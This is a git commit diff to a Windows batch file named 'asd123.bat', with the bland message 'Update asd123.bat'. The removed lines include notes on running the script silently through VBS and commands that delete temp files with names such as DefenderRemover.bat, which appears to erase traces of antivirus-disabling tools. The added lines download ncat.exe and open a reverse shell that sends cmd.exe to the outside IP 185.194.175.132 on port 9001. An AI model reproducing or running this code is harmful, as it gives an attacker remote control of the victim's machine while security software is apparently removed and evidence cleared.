178f49b98bf7f932628b77e2b6e9f544c6fb7d7d
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-03 22:00:03 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -1,23 +1,3 @@
-:: Bu betik arka planda sessiz calissin istiyorsaniz, bir VBS dosyasiyla calistirin
-:: run_silently.vbs icerigi:
-' Set objShell = CreateObject("Wscript.Shell")
-' objShell.Run "your_batch_file.bat", 0, False
-
-:: Bu betigi run_silently.vbs uzerinden baslatin
-@echo off
 cd %temp%
-del /f /q "s.bat" >nul 2>&1
-del /f /q "a.py" >nul 2>&1
-del /f /q "asd.bat" >nul 2>&1
-del /f /q "ddd.vbs" >nul 2>&1
-del /f /q "expe2.bat" >nul 2>&1
-del /f /q "expe2.vbs" >nul 2>&1
-del /f /q "lalala.vbs" >nul 2>&1
-del /f /q "a.ps1" >nul 2>&1
-del /f /q "first.exe" >nul 2>&1
-del /f /q "corpvpn.inf" >nul 2>&1
-del /f /q "RunDefenderRemover.vbs" >nul 2>&1
-del /f /q "DefenderRemover.bat" >nul 2>&1
-rmdir /s /q "Remove_SecurityComp" >nul 2>&1
-rmdir /s /q "Remove_Defender" >nul 2>&1
-
+curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
+ncat.exe 185.194.175.132 9001 -e cmd.exe
